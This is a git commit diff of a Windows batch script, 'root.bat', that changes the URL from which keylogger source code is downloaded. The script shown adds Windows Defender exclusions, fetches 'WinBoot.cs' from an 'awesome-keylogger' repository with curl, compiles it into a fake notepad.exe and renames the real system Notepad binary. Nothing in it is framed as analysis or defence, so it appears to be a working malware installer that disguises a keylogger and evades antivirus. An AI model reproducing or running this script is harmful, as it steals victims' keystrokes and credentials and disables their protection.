e6c02c05426bda85a801e17e675505efa802cd10
dGgzajNzdDNy <avacksalim@gmail.com>
2025-02-15 15:07:08 -0300

    Update root.bat

--- root.bat
+++ root.bat
@@ -3,7 +3,7 @@ powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microso
 powershell Add-MpPreference -ExclusionPath c:\windows\system32\
 doskey INITIALIZE=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 cd %userprofile%
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/refs/heads/main/WinBoot.cs
+curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/WinBoot.cs
 c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe WinBoot.cs
 erase WinBoot.cs
 ren c:\windows\system32\notepad.exe notepad.exe.sync
